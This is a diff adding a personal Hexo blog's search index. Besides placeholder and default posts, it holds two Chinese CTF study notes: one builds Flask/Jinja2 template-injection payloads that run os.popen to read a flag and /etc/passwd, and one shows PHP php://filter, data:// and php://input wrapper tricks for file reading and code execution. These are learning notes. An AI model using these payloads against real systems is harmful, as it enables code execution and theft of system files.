@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>test1</title>
+    <link href="/2025/01/23/test1/"/>
+    <url>/2025/01/23/test1/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>test</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>test</title>
+    <link href="/2025/01/21/test/"/>
+    <url>/2025/01/21/test/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>flask_ssti</title>
+    <link href="/2025/01/21/flask_ssti/"/>
+    <url>/2025/01/21/flask_ssti/</url>
+    
+    <content type="html"><![CDATA[<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">__class__ 返回类型所属的对象<br>__mro__返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析，这里也就是<span class="hljs-keyword">class</span>返回的对象所属的类。<br><span class="hljs-symbol">__base__</span>返回该对象所继承的基类，这里也就是<span class="hljs-symbol">class</span>返回的对象所属的类。<br><span class="hljs-symbol">__subclasses__</span>返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-symbol">__globals__</span>对包含函数全局变量的字典的引用，里面包括<br><span class="hljs-symbol">get_flashed_messages</span>() 返回在<span class="hljs-symbol">Flask</span>中通过 <span class="hljs-symbol">flash</span>() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<span class="hljs-symbol">get_flashed_messages</span>() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。<br><br></code></pre></td></tr></table></figure><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>是类中的一个内置属性，值是该实例的对应的类。这里使用的是<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>，得到的则是空字符串对应的类，也就是字符类。这样操作的意义是将我们现在操作的对象切换到类上面去，这样才能进行之后继承与被继承的操作，所以这里可以选用其他数据类型再来调用<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>属性，效果是一样的(例如[].<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>、&#123;&#125;.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>、True.<span class="hljs-number">__</span><span class="hljs-keyword">class</span>等)。<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;Hello&quot;</span><br><span class="hljs-built_in">print</span>(s.__class__) <br></code></pre></td></tr></table></figure><p>在这个例子中，<code>s</code> 是一个字符串对象，<code>s.__class__</code> 将返回 <code>str</code> 类</p><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(B.__base__) <br></code></pre></td></tr></table></figure><p>这里 <code>B.__base__</code> 将返回 <code>A</code> 类，因为 <code>B</code> 直接继承自 <code>A</code>。</p><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(B.__base__) <br></code></pre></td></tr></table></figure><p>这里 <code>B.__base__</code> 将返回 <code>A</code> 类，因为 <code>B</code> 直接继承自 <code>A</code>。</p><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><ul><li><p><strong>定义</strong>：<code>__globals__</code> 是一个属性，它返回一个包含函数或方法所在模块的全局变量的字典。对于函数和方法，它提供了对全局命名空间的访问。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    x = <span class="hljs-number">10</span><br>    <span class="hljs-built_in">print</span>(func.__globals__)<br><br>func()<br></code></pre></td></tr></table></figure><p>这里<code>func.__globals__</code>将返回一个包含当前模块的全局变量的字典，包括<code>func</code>函数本身，以及其他全局变量，如内置函数和导入的模块。</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="查找基类object在第几个"><a href="#查找基类object在第几个" class="headerlink" title="查找基类object在第几个"></a>查找基类object在第几个</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__bases__<br></code></pre></td></tr></table></figure><h3 id="查看基类下的所有子类"><a href="#查看基类下的所有子类" class="headerlink" title="查看基类下的所有子类"></a>查看基类下的所有子类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br></code></pre></td></tr></table></figure><h4 id="使用脚本查看指定子类的索引"><a href="#使用脚本查看指定子类的索引" class="headerlink" title="使用脚本查看指定子类的索引"></a>使用脚本查看指定子类的索引</h4><p> <a href="..%5Cpy%5Cssti.py">ssti.py</a> </p><h3 id="查看是否存在-builtins-（索引为134）"><a href="#查看是否存在-builtins-（索引为134）" class="headerlink" title="查看是否存在__builtins__（索引为134）"></a>查看是否存在<code>__builtins__</code>（索引为134）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[134].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span><br></code></pre></td></tr></table></figure><p>返回如 <code>&#39;__builtins__&#39;: &#123;&#39;__name__&#39;: &#39;builtins&#39;</code></p><h3 id="存在则查看eval函数"><a href="#存在则查看eval函数" class="headerlink" title="存在则查看eval函数"></a>存在则查看eval函数</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[134].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[%27<span class="hljs-strong">__builtins__</span>%27]<br></code></pre></td></tr></table></figure><p>返回<code>&#39;eval&#39;: &lt;built-in function eval&gt;</code></p><h3 id="执行eval导入os模块并查找flag"><a href="#执行eval导入os模块并查找flag" class="headerlink" title="执行eval导入os模块并查找flag"></a>执行eval导入os模块并查找flag</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">[].__class__.__base__.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>].eval(<span class="hljs-string">&quot;__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(<span class="hljs-variable">%2</span>7cat<span class="hljs-variable">%2</span>0flag<span class="hljs-variable">%27</span>).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>**.popen()<strong>和</strong>.read()**合用可以回显，使用system()只返回整型0或1</p><ul><li>Payload: <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() &#125;&#125;</code></li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ssti</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>php伪协议</title>
+    <link href="/2025/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
+    <url>/2025/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    
+    <content type="html"><![CDATA[<h1 id="PHP-文件处理与协议流"><a href="#PHP-文件处理与协议流" class="headerlink" title="PHP 文件处理与协议流"></a>PHP 文件处理与协议流</h1><h2 id="1-php-filter-协议"><a href="#1-php-filter-协议" class="headerlink" title="1. php://filter 协议"></a>1. <code>php://filter</code> 协议</h2><p><code>php://filter</code> 可以获取指定文件的源码。当它与包含函数结合时，<code>php://filter</code> 流会被当作 PHP 文件执行。为了避免执行，通常对其进行编码，从而实现任意文件读取。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=&lt;编码方式&gt;/resource=&lt;文件路径&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>Base64 编码读取文件内容</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure><p>返回的数据是 Base64 编码后的文件内容。</p></li><li><p><strong>直接读取文件内容</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/resource=index.php</span><br></code></pre></td></tr></table></figure><p>返回未编码的原始文件内容。</p></li></ol><hr><h2 id="2-data-协议"><a href="#2-data-协议" class="headerlink" title="2. data:// 协议"></a>2. <code>data://</code> 协议</h2><p><code>data://</code> 是一种数据流封装器，用于传递相应格式的数据。当它与包含函数（如 <code>include</code>）结合时，用户输入的 <code>data://</code> 流会被当作 PHP 文件执行。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//&lt;数据流类型&gt;;&lt;编码格式&gt;,&lt;数据&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>Base64 编码数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,SSBsb3ZlIFBIUAo=</span><br></code></pre></td></tr></table></figure><p>解码后为：<code>I love PHP</code>。</p></li><li><p><strong>普通文本数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,welcome to the zjctf</span><br></code></pre></td></tr></table></figure><p>直接显示：<code>welcome to the zjctf</code>。</p></li></ol><hr><h2 id="3-php-input-协议"><a href="#3-php-input-协议" class="headerlink" title="3. php://input 协议"></a>3. <code>php://input</code> 协议</h2><p>当遇到 <code>file_get_contents()</code> 函数时，可以使用 <code>php://input</code> 绕过。<code>php://input</code> 可以访问请求的原始数据的只读流，将 POST 请求的数据当作 PHP 代码执行。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li>当传入的参数作为文件名打开时，可以将参数设为 <code>php://input</code>，同时 POST 想要设置的文件内容。PHP 执行时会将 POST 内容当作文件内容，从而导致任意代码执行。</li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>请求 URL</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/cmd.php?cmd=php:/</span>/input<br></code></pre></td></tr></table></figure></li><li><p><strong>POST 数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="4-file-协议"><a href="#4-file-协议" class="headerlink" title="4. file:// 协议"></a>4. <code>file://</code> 协议</h2><p><code>file://</code> 用于访问本地文件系统。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//&lt;文件的绝对路径与文件名&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//D:/flag.txt</span><br></code></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th align="left">协议</th><th align="left">用途</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>php://filter</code></td><td align="left">读取文件内容，支持编码</td><td align="left"><code>php://filter/read=convert.base64-encode/resource=index.php</code></td></tr><tr><td align="left"><code>data://</code></td><td align="left">传递数据流，支持编码</td><td align="left"><code>data://text/plain;base64,SSBsb3ZlIFBIUAo=</code></td></tr><tr><td align="left"><code>php://input</code></td><td align="left">读取 POST 请求的原始数据</td><td align="left"><code>http://127.0.0.1/cmd.php?cmd=php://input</code> + POST <code>&lt;?php phpinfo();?&gt;</code></td></tr><tr><td align="left"><code>file://</code></td><td align="left">访问本地文件系统</td><td align="left"><code>file://D:/flag.txt</code></td></tr></tbody></table><hr>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="/2025/01/21/hello-world/"/>
+    <url>/2025/01/21/hello-world/</url>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
